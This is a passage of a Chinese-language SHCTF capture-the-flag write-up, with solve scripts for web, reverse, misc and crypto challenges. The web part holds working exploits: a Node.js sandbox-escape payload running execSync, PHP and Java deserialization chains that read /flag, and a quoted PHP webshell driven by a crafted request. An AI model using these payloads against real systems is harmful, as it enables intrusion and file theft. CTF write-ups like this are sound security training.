    
    # Define escape function: Function("return escape")()
    esc_fn = f"{FN}({str_return}+{chars[' ']}+{str_escape})()"

    # Get '%' from escape(' ') -> "%20"
    pct_val = f"{esc_fn}({chars[' ']})"
    chars['%'] = g(pct_val, 0)

    # Helper to generate any char via unescape("%XX")
    def get_unescaped_char(c):
        hex_code = hex(ord(c))[2:] # e.g. '2f' for '/'
        # Build the hex string part
        hex_str_parts = [chars['%']]
        for h in hex_code:
            if h.lower() in chars:
                hex_str_parts.append(chars[h.lower()])
            else:
                # Should not happen as we have 0-9 and a-f
                raise Exception(f"Cannot generate hex char {h}")
        hex_payload = "+".join(hex_str_parts)
        return f"{unesc_fn}({hex_payload})"

    # 6. Construct RCE Payload
    # Using process.mainModule.require because 'require' might not be global in Function scope
    cmd = "return process.mainModule.require('child_process').execSync('cat /flag').toString()"
    
    payload_parts = []
    for c in cmd:
        if c in chars:
            payload_parts.append(chars[c])
        elif c in "/'\"-_":
            payload_parts.append(get_unescaped_char(c))
        elif c.isupper(): # Handle uppercase (M)
            payload_parts.append(get_unescaped_char(c))
        else:
            payload_parts.append(get_unescaped_char(c))
    
    payload_code = "+".join(payload_parts)
    
    # Final execution: Function(payload_code)()
    exploit = f"{FN}({payload_code})()"
    return exploit

if __name__ == "__main__":
    print("[*] Generating payload...")
    payload = generate_payload()
    print(f"[*] Payload length: {len(payload)} bytes")
    
    # Ensure no '8' is in the payload
    if '8' in payload:
        print("[!] Error: Payload contains forbidden character '8'")
        sys.exit(1)

    print(f"[*] Sending payload to {TARGET_URL}...")
    try:
        r = requests.post(TARGET_URL, json={"expr": payload})
        if r.status_code == 200:
            print("[+] Response:")
            print(r.text)
        else:
            print(f"[-] Failed with status {r.status_code}")
            print(r.text)
    except Exception as e:
        print(f"[!] Error: {e}")
```

### Ezphp

```python
import requests

# 辅助函数：手动生成序列化字符串
def s_str(s):
    return f's:{len(s)}:"{s}";'
def s_null():
    return 'N;'
def s_obj(name, props):
    content = ""
    for k, v in props:
        content += f's:{len(k)}:"{k}";{v}'
    return f'O:{len(name)}:"{name}":{len(props)}:{{{content}}}'

# === 构造 POP 链 ===
# 1. Inner Solar (执行命令): ReflectionFunction("readfile")->invoke("/flag")
solar_inner_props = [
    (f'\0Solar\0Sun', s_null()), 
    ('Mercury', s_null()),
    ('Venus', s_null()),
    ('Earth', s_null()),
    ('Mars', s_null()),
    ('Jupiter', s_str('invoke')), # 方法
    ('Saturn', s_str('/flag')),   # 参数
    ('Uranus', s_null()),
    ('Neptune', s_null())
]
s_inner = s_obj('Solar', solar_inner_props)

# 2. Outer Solar (触发 __call)
solar_outer_props = [
    (f'\0Solar\0Sun', s_null()),
    ('Mercury', s_inner),                  # $Dyson
    ('Venus', s_str('ReflectionFunction')),# $Sphere
    ('Earth', s_null()),
    ('Mars', s_null()),
    ('Jupiter', s_null()),
    ('Saturn', s_null()),
    ('Uranus', s_null()),
    ('Neptune', s_null())
]
s_outer = s_obj('Solar', solar_outer_props)

# 3. Earth (触发 __set)
earth_props = [
    ('onearth', s_outer),
    ('inearth', s_str('Sun')),
    ('outofearth', s_str('readfile'))
]
s_earth = s_obj('Earth', earth_props)

# 4. Moon (触发 __invoke)
moon_props = [
    ('nearside', s_earth),
    ('farside', s_null())
]
s_moon = s_obj('Moon', moon_props)

# 5. Sun (触发 __toString)
sun_props = [
    ('sun', s_moon)
]
s_sun = s_obj('Sun', sun_props)

# === 关键：GC Bypass Payload ===
# 构造数组 a:2:{i:0; $obj; i:0; N;}
# 利用索引覆盖，强制在 unserialize 过程中销毁对象
payload = f'a:2:{{i:0;{s_sun}i:0;N;}}'

print(f"[*] Payload created (Length: {len(payload)})")

# === 发送请求 ===
url = 'http://challenge.shc.tf:30362/index.php'
# requests 会处理好编码问题，因为这里我们生成的是原始字符串
r = requests.post(url, data={'travel': payload})

if "SHCTF" in r.text or "flag" in r.text:
    print("\n[SUCCESS] Flag found!")
    # 提取 Flag
    print(r.text)
else:
    print("\n[FAIL] Output:")
    print(r.text)
```

### **你也懂java？**

```java
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;

public class Exploit {
    public static void main(String[] args) throws Exception {
        // The file you want to read on the server.
        // Common CTF locations: "/flag", "/flag.txt", "./flag"
        String targetFile = "/flag";
        
        System.out.println("Generating payload to read: " + targetFile);

        // Create the malicious object
        Note maliciousNote = new Note("Exploit", "Pwn", targetFile);

        // Serialize the object to a file named 'payload.bin'
        try (FileOutputStream fos = new FileOutputStream("payload.bin");
             ObjectOutputStream oos = new ObjectOutputStream(fos)) {
            oos.writeObject(maliciousNote);
        }
        
        System.out.println("Success! Payload saved to 'payload.bin'");
    }
}

// This class mimics the server's Note class exactly
class Note implements Serializable {
    private static final long serialVersionUID = 1L;

    private String title;
    private String message;
    private String filePath;

    public Note(String title, String message, String filePath) {
        this.title = title;
        this.message = message;
        this.filePath = filePath;
    }
}
```

### **05_em_v_CFK**

将提示进行ROT13和Base64解码后得到：我上传了个shell.php, 带上show参数get小明的圣遗物吧

访问路径/uploads/shell.php得到shell.php源码

```php
<?php

if (isset($_GET['show'])) {
    highlight_file(__FILE__);
}

$pass = 'c4d038b4bed09fdb1471ef51ec3a32cd';

if (isset($_POST['key']) && md5($_POST['key']) === $pass) {
    if (isset($_POST['cmd'])) {
        system($_POST['cmd']);
    } elseif (isset($_POST['code'])) {
        eval($_POST['code']);
    }
} else {
    http_response_code(404);
}
```

爆破md5得到key=114514

进而可以执行任意命令

发现flag不在根目录下， 读取connect.php源码得到提示， 使用如下代码获取flag

```
POST /uploads/shell.php HTTP/1.1
Host: challenge.shc.tf:32080
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 148

key=114514&code=include "../connect.php"; $stmt = $pdo->prepare("CALL buy_item(3, 100.00)"); $stmt->execute(); $res = $stmt->fetch(); print_r($res);
```

```
Array
(
    [current_price] => 50
    [final_message] => SHCTF{378fccf3-d907-45df-b06f-90e4cc3f49a1}
)
```

## Reverse

### a_cup_of_tea
TEA
```python
import struct

def decrypt_tea(v, k):
    v0, v1 = v[0], v[1]
    k0, k1, k2, k3 = k[0], k[1], k[2], k[3]
    
    delta = 0x9E3779B9
    sum_val = (delta * 32) & 0xFFFFFFFF
    
    for _ in range(32):
        v1 = (v1 - (((v0 << 4) + k2) ^ (v0 + sum_val) ^ ((v0 >> 5) + k3))) & 0xFFFFFFFF
        v0 = (v0 - (((v1 << 4) + k0) ^ (v1 + sum_val) ^ ((v1 >> 5) + k1))) & 0xFFFFFFFF
        sum_val = (sum_val - delta) & 0xFFFFFFFF
        
    return [v0, v1]

def solve():

    key_str = b"welcome_to_SHCTF"
    key = struct.unpack("<4I", key_str)

    c1 = [
        -1699360031 & 0xFFFFFFFF, # 0x9AB362E1
        -1120419751 & 0xFFFFFFFF  # 0xBD37F059
    ]
    c2 = [
        -1515845715 & 0xFFFFFFFF, # 0xA5A1A7AD
        -1804683212 & 0xFFFFFFFF  # 0x946E9434
    ]


    p1 = decrypt_tea(c1, key)
    p2 = decrypt_tea(c2, key)

    flag_bytes = struct.pack("<2I", *p1) + struct.pack("<2I", *p2)
    
    try:
        flag_content = flag_bytes.decode('utf-8')
        print(f"Flag: SHCTF{{{flag_content}}}")
    except UnicodeDecodeError:
        print(f"Decrypted bytes (raw): {flag_bytes}")

if __name__ == "__main__":
    solve()
   
Flag: SHCTF{W0w_u_kN0w_t3A!!}
```

### **where are you**

```python
def solve():
    # 1. Generate the RC4 Key (from TLS Callback logic)
    seed_str = "MyS3cr3tS33d"
    key = []
    for i in range(16):
        char_code = ord(seed_str[i % 12])
        # Key generation algorithm: (Seed[i%12] ^ 0xAA) + 7*i
        val = (7 * i + (char_code ^ 0xAA)) & 0xFF
        key.append(val)
    
    # 2. Extract the Ciphertext (36 bytes from .rdata offset 0x4031D4)
    # The bytes are located immediately after the string "pause" in the binary.
    ciphertext = [
        0xEA, 0x64, 0x65, 0x15, 0xFF, 0x0A, 0xAD, 0x41, 0x6F, 0x81, 0xA1, 0x7B, 
        0xA8, 0xD0, 0x5E, 0x69, 0x74, 0x92, 0x6A, 0xE3, 0xBD, 0x6B, 0x33, 0x97, 
        0x2D, 0xC2, 0xB5, 0xFA, 0xD0, 0x8F, 0x6D, 0x3F, 0xAD, 0x00, 0xD0, 0x91
    ]

    # 3. Perform RC4 Decryption
    # Key Scheduling Algorithm (KSA)
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    
    # Pseudo-Random Generation Algorithm (PRGA)
    flag_bytes = []
    i = 0
    j = 0
    for byte in ciphertext:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) % 256]
        flag_bytes.append(byte ^ K)
    
    print("Flag:", "".join(chr(b) for b in flag_bytes))

if __name__ == "__main__":
    solve()
```

### **damagedPE**

将偏移 `0x80` 处的 `53 48` 修改为 `50 45`。修复后，这便是一个合法的 PE 可执行文件。运行得到

```
flag{pe_struct_
```

在修复头后，查看文件中的字符串，特别是在偏移 `0x2C00` 处（位于名为 `.ctf` 的区段），可以找到一段关键提示：

```
h3ad3r_m4g1c_Please add the second IAT item content at the end and add } as the answer.
```

根据提示得到字符串 **`CreateFileA`**。最终flag：

```
flag{pe_struct_h3ad3r_m4g1c_CreateFileA}
```

### **Safe Image Encryption**

拿到题目 `encrypt`，直接拖进 IDA。

看 `main` 函数，逻辑很清晰：

1. 用了 `stb_image` 库读图，而且强制读成 **RGBA 4通道**（这点很关键）。
2. 读取 `key_file`，长度硬编码检查了是 **1003** 字节。
3. 遍历像素进行加密。

核心加密逻辑在那个大循环里，看伪代码大概是这样：

- R, G, B, A 四个通道分别对应不同的异或加密公式。
- Key 的取值是循环取模的：`key[i % 1003]`。
- 加密公式里杂糅了坐标 `x, y` 和 Key。

乍一看好像没办法，因为不知道 Key。

但是注意一点：程序强制加载为 RGBA 格式。

对于绝大多数正常的 png/jpg 图片，**Alpha通道（透明度）的值通常全是 255 (0xFF)**。

这就是我们的突破口：**已知明文攻击**。

看 Alpha 通道的加密代码：

```c
// 伪代码逻辑
v18 = (*(key + index) ^ 0x55) - 16;
Enc_A = Orig_A ^ v18;
```

既然我们知道 `Orig_A` 是 `0xFF`，那就可以反推 Key：

1. `v18 = Enc_A ^ 0xFF`
2. `key_byte = ((Enc_A ^ 0xFF) + 16) ^ 0x55`

因为图片很大，像素点远多于 1003 个，遍历一遍加密图片的 Alpha 通道就能把完整的 Key 恢复出来。

拿到 Key 之后，再把 R、G、B 通道按题目的公式逆运算回去就行。

直接上脚本，用 Python 的 PIL 处理图片方便点。

Python

```python
import numpy as np
from PIL import Image

def solve():
    # 1. 读入加密图片，强制转RGBA方便处理
    try:
        img = Image.open("encrypted.png").convert("RGBA")
    except:
        print("没找到 encrypted.png")
        return

    # 转 numpy 数组，方便批量运算
    data = np.array(img)
    h, w, c = data.shape
    
    # 拉平成一维数组，对应C语言里的处理方式
    # 每个像素4个字节，展平方便算索引
    flat_pixels = data.reshape(-1, 4)
    total_pixels = w * h
    
    # 2. 恢复 Key
    KEY_LEN = 1003
    key = np.zeros(KEY_LEN, dtype=np.uint8)
    
    # 取出 Alpha 通道 (索引 3)
    enc_a = flat_pixels[:, 3].astype(np.int32)
    
    # 题目逻辑：像素也是平铺处理的
    # key 的索引对应关系：(pixel_index * 4 + channel_offset) % 1003
    # Alpha 通道对应的是 offset + 3
    pixel_indices = np.arange(total_pixels)
    byte_indices = pixel_indices * 4
    k3_indices = (byte_indices + 3) % KEY_LEN
    
    # 反推公式: key = ((Enc_A ^ 0xFF) + 16) ^ 0x55
    # 注意加法要 & 0xFF 防止溢出
    recovered_k3 = (((enc_a ^ 0xFF) + 16) & 0xFF) ^ 0x55
    
    # 填入 Key
    key[k3_indices] = recovered_k3.astype(np.uint8)
    print("[+] Key 恢复完成")

    # 3. 解密 RGB 通道
    # 构造坐标矩阵 x, y
    xv, yv = np.meshgrid(np.arange(w), np.arange(h))
    x = xv.flatten().astype(np.int32)
    y = yv.flatten().astype(np.int32)
    
    # 准备各通道对应的 Key
    k0 = key[byte_indices % KEY_LEN].astype(np.int32)
    k1 = key[(byte_indices + 1) % KEY_LEN].astype(np.int32)
    k2 = key[(byte_indices + 2) % KEY_LEN].astype(np.int32)
    
    # 提取密文数据
    enc_r = flat_pixels[:, 0].astype(np.int32)
    enc_g = flat_pixels[:, 1].astype(np.int32)
    enc_b = flat_pixels[:, 2].astype(np.int32)
    
    # 逆向异或逻辑 (照抄 IDA 里的公式即可)
    # Red:  Mask = (x*x + k0) + (k0 ^ 0xAA)
    mask_r = (x*x + k0 + (k0 ^ 0xAA)) & 0xFF
    dec_r = (enc_r ^ mask_r).astype(np.uint8)
    
    # Green: Mask = k2 ^ (x*y) ^ (3*k1)
    mask_g = (k2 ^ (x*y) ^ ((3*k1) & 0xFF)) & 0xFF
    dec_g = (enc_g ^ mask_g).astype(np.uint8)
    
    # Blue: Mask = (y*y + k1) + ((2*k2) ^ 0x66)
    mask_b = ((y*y + k1) + ((2*k2) ^ 0x66)) & 0xFF
    dec_b = (enc_b ^ mask_b).astype(np.uint8)
    
    # 4. 重组图片
    dec_a = np.full(total_pixels, 255, dtype=np.uint8)
    
    res_flat = np.stack((dec_r, dec_g, dec_b, dec_a), axis=1)
    res_data = res_flat.reshape((h, w, 4))
    
    Image.fromarray(res_data).save("flag.png")
    print("[+] flag.png 已保存")

if __name__ == "__main__":
    solve()
```

### **LicenseVerifier**

先用在线工具把exe解包， 找到main.pyc

用pycdas反汇编出字节码， 发现需要找sys_core.pyc

再次反汇编出sys_core.pyc的字节码， 编写脚本

```python
import hashlib
import struct
import sys
import os

# Extracted from disassembly
API_SECRET = 'SysCore@2025#internal_key'
CONFIG_FILE = 'sys.config'

def derive_key(length):
    payload = (API_SECRET + str(length)).encode()
    return hashlib.sha256(payload).digest()

def solve():
    if not os.path.exists(CONFIG_FILE):
        print(f"[-] '{CONFIG_FILE}' not found.")
        print(f"[+] Assuming static flag: SHCTF{{{API_SECRET}}}")
        return

    with open(CONFIG_FILE, 'rb') as f:
        data = f.read()

    # 1. Decrypt Bytecode
    code_len = struct.unpack('<H', data[:2])[0]
    encrypted_payload = data[2:]
    key = derive_key(code_len)
    
    decrypted = bytearray()
    for i, byte in enumerate(encrypted_payload):
        # Layer 1: Arithmetic/XOR Stream
        mask = ((i * 165) ^ 92) & 0xFF
        val = byte ^ mask
        # Layer 2: Key XOR
        decrypted.append(val ^ key[i % len(key)])
        
    bytecode = decrypted[:code_len]
    print(f"[+] Decrypted {len(bytecode)} bytes of bytecode")

    # 2. Symbolic Execution (Z3)
    try:
        from z3 import Solver, BitVec, sat
    except ImportError:
        print("[-] z3-solver not installed (pip install z3-solver)")
        return

    solver = Solver()
    stack = []
    flag_chars = {} # Maps index -> BitVec

    def get_char_var(idx):
        if idx not in flag_chars:
            v = BitVec(f'flag_{idx}', 16)
            solver.add(v >= 32, v <= 126) # Printable ASCII
            flag_chars[idx] = v
        return flag_chars[idx]

    ip = 0
    while ip < len(bytecode):
        op = bytecode[ip]
        ip += 1
        
        if op == 1: # OP_PUSH
            val = struct.unpack('<H', bytecode[ip:ip+2])[0]
            ip += 2
            stack.append(val)
        elif op == 2: # OP_XOR
            a, b = stack.pop(), stack.pop()
            stack.append(a ^ b)
        elif op == 3: # OP_ADD
            a, b = stack.pop(), stack.pop()
            stack.append((a + b) & 0xFFFF)
        elif op == 4: # OP_SUB (Top - Second)
            a, b = stack.pop(), stack.pop()
            stack.append((a - b) & 0xFFFF)
        elif op == 5: # OP_LOAD
            idx = struct.unpack('<H', bytecode[ip:ip+2])[0]
            ip += 2
            stack.append(get_char_var(idx))
        elif op == 6: # OP_CHECK
            target = struct.unpack('<H', bytecode[ip:ip+2])[0]
            ip += 2
            solver.add(stack.pop() == target)
        elif op == 8: # OP_HALT
            break

    if solver.check() == sat:
        model = solver.model()
        indices = sorted(flag_chars.keys())
        flag = "".join(chr(model[flag_chars[i]].as_long()) for i in indices)
        print(f"[+] Calculated Flag: {flag}")
    else:
        print("[-] UNSAT: Could not find flag.")

if __name__ == "__main__":
    solve()
```

```
[+] Decrypted 1009 bytes of bytecode
[+] Calculated Flag: SHCTF{Vm_1s_FuN_&_PyTh0n_1s_PoW3rFuL_But_R3aL_W0r1d_1s_M0r3_C0mp1ic4t3d}
```

## Misc

### 提问前请先搜索

复制出来是乱码， 但是可以直接看。SHCTF{DO_NOT_reIy_On_Al}

### Evan

用binwalk提取发现有flag.zip， 尝试unzip提示有密码。用hd查看zip文件头为伪加密， 用zip -FF flag.zip --out flag_fixed.zip命令修复以后unzip得到flag。

SHCTF{Evan_1s_s0_h4nds0me!}

### **奇怪的数据**

```python
from PIL import Image
import re

# 读取数据
with open('flag.txt', 'r') as f:
    data = f.read()

# 提取所有 RGB 元组 (r,g,b)
pixels = re.findall(r'\((\d+),(\d+),(\d+)\)', data)
pixels = [(int(r), int(g), int(b)) for r, g, b in pixels]

print(f"总像素数: {len(pixels)}")

# 尝试不同的图像尺寸（优先尝试正方形）
import math
total = len(pixels)
width = int(math.sqrt(total))
while total % width != 0:
    width -= 1
height = total // width

print(f"推断尺寸: {width} x {height}")

# 创建图像
img = Image.new('RGB', (width, height))
img.putdata(pixels)

# 保存和显示
img.save('flag_recovered.png')
print("图像已保存为 flag_recovered.png")

# 可选：尝试其他常见尺寸（如果正方形效果不好）
# 例如 256x256, 512x512 等
# 可根据实际像素总数调整
```

用脚本回复图像是一个二维码， 扫码后得到U0hDVEZ7VGgzX1F1ZXN0MW9uNV9BcmVfVG9vX0QxZmZpY3UxdCEhISF9是base64还原以后得到SHCTF{Th3_Quest1on5_Are_Too_D1fficu1t!!!!}

### **不止二维码**

LSB隐写

| **通道**  | **提取内容**                                                 |
| --------- | ------------------------------------------------------------ |
| **Red**   | `FLAG_PART_1: SHCTF{55a23d24-`                               |
| **Green** | `FLAG_PART_2: ABBB/AABBB/AAAAA/BBBBB/ABBBBA/BBBBA/B/AABBB/ABBB` |
| **Blue**  | `FLAG_PART_3: MkZkbDg3ZlY3ZEQxalNGenQyZUFYT3E0NmRrTXFV`      |

PART2是摩斯电码， A=`-`，B=`.`

得到b705-4e7b

PART3是多层base， 经过base64->base62->base58->base32以后得到`-942e-bdd}`
最终flag：`SHCTF{55a23d24-b705-4e7b-942e-bdd}`

### **Office**

使用MS Office打开得到密文：
```
lRy1m2qYkmewkTqDrneCoTCQoUiFqm7zqoeRoT7DqDCAqm7QsTqRuT3PqjWUt5e7
```
已知 Flag 开头是 `SHCTF{`，其标准的 Base64 编码为 `U0hDVEZ7`。通过对比密文前 8 位和明文 Base64 编码的索引位置，可以发现位移规律：

| **密文** | **密文索引** | **明文B64** | **明文索引** | **差值 (Key)**  |
| -------- | ------------ | ----------- | ------------ | --------------- |
| l        | 37           | U           | 20           | **17**          |
| R        | 17           | 0           | 52           | **29** (mod 64) |
| y        | 50           | h           | 33           | **17**          |
| 1        | 53           | D           | 3            | **50**          |
| m        | 38           | V           | 21           | **17**          |
| 2        | 54           | E           | 4            | **50**          |
| q        | 42           | Z           | 25           | **17**          |
| Y        | 24           | 7           | 59           | **29** (mod 64) |

观察字符类型与位移量的关系：

- **小写字母 (a-z)**：位移量为 **17**
- **大写字母 (A-Z)**：位移量为 **29**
- **数字 (0-9)**：位移量为**50**或者**-2**

```python
import base64

cipher = "lRy1m2qYkmewkTqDrneCoTCQoUiFqm7zqoeRoT7DqDCAqm7QsTqRuT3PqjWUt5e7"
b64_table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

def solve():
    b64_res = ""
    for c in cipher:
        idx = b64_table.index(c)
        if 'a' <= c <= 'z':
            offset = 17
        elif 'A' <= c <= 'Z':
            offset = 29
        elif '0' <= c <= '9':
            offset = -2 if c == '7' else 50
        else:
            offset = 0
        
        b64_res += b64_table[(idx - offset) % 64]
    print("Base64:", b64_res)
    print("Flag:", base64.b64decode(b64_res).decode())

solve()
```

运行脚本得到还原后的 Base64 串为：

```
U0hDVEZ7TVNfT2ZmaWNlX2lzX3RoZV9iZXN0X29mZmljZV9zb2Z0d2FyZS53cHM9
```

最终 Flag：

**`SHCTF{MS_Office_is_the_best_office_software.wps}`**

## Crypto

### hash2
安装HashClash。
```bash
./bin/md5_fastcoll -p prefix.txt -o apple1.bin apple2.bin
```
prefix.txt里是16个A。
生成出的两个结果满足前16字符相同， md5值相同但是文件内容不同。

### hash1
跟hash1相比少了前16字符是数字或者字母的要求， 用hash2的结果就行了。

### **TE**

```python
from Crypto.Util.number import long_to_bytes
from math import gcd

# Given values
e1 = 740153575
e2 = 2865243571
n = 136622832042809215646904518487100682818433235485047740604612449039291802103378650845690420527029208661555957840623544220907967041438993189882681277161437473818861280518627112617436473837014181944318974950710633690704711613682306786783611123590732850783007770603201513394002330426718261667816328404673167404897
c1 = 56187319559060690757544481076112948328826527679002578544683022765347668056620384831778729489197135280950314627119815558644487151419126272267146826463912815062442590228193753706779325992179790583792001196548329204758137104234662611732735693150331594645734142941475121453410494160975503459516324097097434727685
c2 = 45042409947237296641429229414329516753664139389113206575966507524195434716702812078844474626406932213486611190698953613898299571473488550533642524208077653917354039305279692307471529748408234617430389423630015569730564585740596832844917494965974840512412454337766930330443409183293514761911902752336129193323

# Verify gcd(e1, e2) = 1
assert gcd(e1, e2) == 1, "e1 and e2 must be coprime"

# Extended Euclidean Algorithm to find a, b such that a*e1 + b*e2 = 1
def egcd(a, b):
    if a == 0:
        return b, 0, 1
    g, y, x = egcd(b % a, a)
    return g, x - (b // a) * y, y

g, a, b = egcd(e1, e2)
assert g == 1, "gcd must be 1"

# Compute m = c1^a * c2^b mod n
if a < 0:
    c1 = pow(c1, -1, n)  # modular inverse
    a = -a
if b < 0:
    c2 = pow(c2, -1, n)  # modular inverse
    b = -b

m = (pow(c1, a, n) * pow(c2, b, n)) % n
flag = long_to_bytes(m)

print(f"Recovered flag: {flag.decode()}")
```

### not_eight_length

```python
from Crypto.Util.number import long_to_bytes, inverse
from sympy import isprime, nextprime
import math

n = 172113078605688993167549425692325605693719693815361211139292482064751327114103720980024048929660587708361336638391782482562146750015275689746844657810313957504514376746631004470588767450715447808496931019899675426647981223953742448155335425954936981689508246039354976739386690722681509534696120714425567962527
e = 65537
c = 47611886444337000128826989676221463775339201602510220886566675518701473035795983698414894648685567473325732994652173596155832091773084566434572294009136327143103984205257862772844337876748271318723897875683699389776414143689503392203746843332334862282735760778003407162335426111769147991087343730761557771446

# Factor n by searching near sqrt(n)
p_approx = int(math.isqrt(n))
for i in range(5000):
    p_candidate = p_approx - i
    if not isprime(p_candidate):
        continue
    temp = nextprime(p_candidate)
    q_candidate = nextprime(temp)
    if p_candidate * q_candidate == n:
        p, q = p_candidate, q_candidate
        print(f"[+] Found p: {p}")
        print(f"[+] Found q: {q}")
        break
else:
    raise ValueError("Failed to factor n")

# Decrypt RSA
phi = (p - 1) * (q - 1)
d = inverse(e, phi)
m = pow(c, d, n)

# Try UTF-8 first (for completeness)
try:
    flag = long_to_bytes(m).decode('utf-8')
    print(f"\nFlag (UTF-8): {flag}")
except UnicodeDecodeError:
    # 7-bit ASCII decoding fallback (the actual solution)
    bits = bin(m)[2:]  # Remove '0b' prefix
    # Pad to multiple of 7 bits
    if len(bits) % 7 != 0:
        bits = '0' * (7 - len(bits) % 7) + bits
    
    # Split into 7-bit chunks and convert to characters
    chars = []
    for i in range(0, len(bits), 7):
        chunk = bits[i:i+7]
        if chunk:  # Skip empty chunks
            chars.append(chr(int(chunk, 2)))
    
    flag = ''.join(chars)
    print(f"\nFlag (7-bit ASCII): {flag}")
```

### **古典也颇有韵味啊**

看到 `encode_key` 是只有 AB 的长串，一眼**培根密码 (Bacon's Cipher)**。
按 5 个一组切分，对着表（24字母表，I=J, U=V）解一下：
解出来是：**NOTVIGENERE**

拿到 Key 是 `NOTVIGENERE`，说明不是维吉尼亚，应该是 **Autokey Vigenère **
前缀解出来是：`oops! you made it here is your flag:`
接着解 flag 部分：
`wpurt` -> `shctf`
`{wc@xdii...}` -> `{cl@ssic_c2ypto_also_crypt0}`

**Flag:**
`shctf{cl@ssic_c2ypto_also_crypt0}`

### **Ez_RSA**

Wiener's Attack

```python
from Crypto.Util.number import long_to_bytes
import gmpy2

def rational_to_contfrac(x, y):
    while y:
        a = x // y
        yield a
        x, y = y, x - a * y

def convergents_from_contfrac(frac):
    convs = []
    for i in range(len(frac)):
        if i == 0:
            num = frac[0]
            den = 1
        elif i == 1:
            num = frac[0] * frac[1] + 1
            den = frac[1]
        else:
            num = frac[i] * convs[-1][0] + convs[-2][0]
            den = frac[i] * convs[-1][1] + convs[-2][1]
        convs.append((num, den))
    return convs

def wiener_attack(e, n):
    cf = list(rational_to_contfrac(e, n))
    convs = convergents_from_contfrac(cf)
    for k, d in convs:
        if k == 0:
            continue
        if (e * d - 1) % k != 0:
            continue
        phi = (e * d - 1) // k
        s = n - phi + 1
        disc = s * s - 4 * n
        if disc < 0:
            continue
        if gmpy2.is_square(disc):
            return d
    return None

n = 107464134871680646151655304067173578951022679613817744422854142736895193478923970402314237869266898585661396817719803005109183572552933963881756199330890085692291647461683934019264121186823772581796061998307778635680038707808422026396560620912393186072263186503236380890048319797143644270579169484448179083299
e = 3924586561728843234261049280560557566669922961436496251423249382498887294225142535297862819865029081145630384268177735578769958711287734205364353929040337350836000661255957087233897675207507752217828489549059197109918195953230752720210793300168746820366115929509596904295875481061789801178045962611893883689
c = 4557192604704814579224198928010541193712311907197292139423304635523945088581321950910727673367241811197226152299201713883344661436550024661781925551129803469824570154317098612833694631836257698682075695287756551674264966935203485636255394639674521955953445322493019052791894426980946209383266707043869522774

d = wiener_attack(e, n)
if d:
    print("d found:", d)
    m = pow(c, d, n)
    flag = long_to_bytes(m)
    print("Flag:", flag.decode())
else:
    print("Attack failed.")
```

### **椭圆曲线？？？！！！**

```python
import binascii

# Values provided in the JSON
start = 0x53484354467b3230353426dd1c6dd189cb364e9d063309b9fab0c1126c020677e70ef6407f2a635c82573e
end   = 0x53484354467b3230353440dc72476a7e08b5b396aa73d1169b4ca1c340276d7be542632f7c484a30163906

# 1. Solve for p
# end - start = 40 * p
diff = end - start
p = diff // 40

# 2. Solve for secret (the flag)
# secret = start + 19 * p
secret = start + 19 * p

# 3. Convert the integer secret to bytes
# Calculate the number of bytes required
byte_len = (secret.bit_length() + 7) // 8
flag_bytes = secret.to_bytes(byte_len, 'big')

print(f"Flag: {flag_bytes.decode()}")
```

### **隐藏的子集和？**

```python
from sage.all import *
from Crypto.Util.number import long_to_bytes

def solve():
    print("[*] Loading data from data.txt...")
    try:
        with open("data.txt", "r") as f:
            lines = f.readlines()
            # 第一行是 p
            p = Integer(lines[0].strip())
            # 第二行是 h 的列表，使用 eval 安全解析
            h_list = eval(lines[1].strip())
    except Exception as e:
        print(f"[-] Error loading data: {e}")
        return

    # 初始化参数
    h_vec = vector(ZZ, h_list)
    m = len(h_vec)
    n = 70  # 题目给定的 n
    
    print(f"[+] Parameters: n={n}, m={m}")
    print(f"[+] p = {p}")
    
    # 理论上 kernel 的维度应为 m - n
    target_dim = m - n
    print(f"[+] Target kernel dimension (m - n): {target_dim}")

    # =======================================================
    # Step 1: 构造正交格 (Orthogonal Lattice)
    # 目标: 寻找 u 使得 h . u = 0 (mod p)
    # =======================================================
    print("\n[*] Step 1: Running LLL to find orthogonal vectors...")
    
    # 权重 K 需要足够大，保证模 p 约束优先满足
    # K 只要大于 p 即可，或者取 2^1000 这种大数
    K = 2**1000 
    M_mat = Matrix(ZZ, m + 1, m + 1)
    
    # 构造 Nguyen-Stern 格: [ I_m | K*h^T ]
    #                      [  0  | K*p   ]
    for i in range(m):
        M_mat[i, i] = 1
        M_mat[i, m] = h_vec[i] * K
    M_mat[m, m] = p * K

    B = M_mat.LLL()

    # 收集满足模数约束的向量 (即最后一位为 0 的向量)
    kernel_vectors = []
    for row in B:
        if row[m] == 0:
            v = row[:m]
            if not v.is_zero():
                kernel_vectors.append(v)
    
    # 【关键修正 1】按长度排序，确保最短的在前
    kernel_vectors.sort(key=lambda x: x.norm())
    
    print(f"[+] Found {len(kernel_vectors)} orthogonal vectors (Full Rank).")
    
    # 打印断层验证 (Gap Check)
    # 正常情况下，第 m-n-1 个向量很短，第 m-n 个向量会突然变长
    if len(kernel_vectors) > target_dim:
        print("[*] Verifying Gap (Norms):")
        print(f"    Vector #{target_dim-1} norm: {float(kernel_vectors[target_dim-1].norm()):.2f}")
        print(f"    Vector #{target_dim}   norm: {float(kernel_vectors[target_dim].norm()):.2f} <--- Expect Huge Jump")

    # 【关键修正 2】严格只取前 m-n 个向量
    if len(kernel_vectors) < target_dim:
        print("[-] Error: Not enough vectors found.")
        return

    print(f"\n[*] Selecting top {target_dim} vectors to recover A...")
    U = Matrix(ZZ, kernel_vectors[:target_dim])

    # =======================================================
    # Step 2: 计算对偶格 (Recover A)
    # =======================================================
    print("[*] Step 2: Computing right kernel to recover A's row space...")
    
    # 计算 U 的右核。因为 A * U^T = 0，所以 A 的行向量在 U 的右核中。
    L_A = U.right_kernel()
    basis_A = L_A.basis_matrix()
    
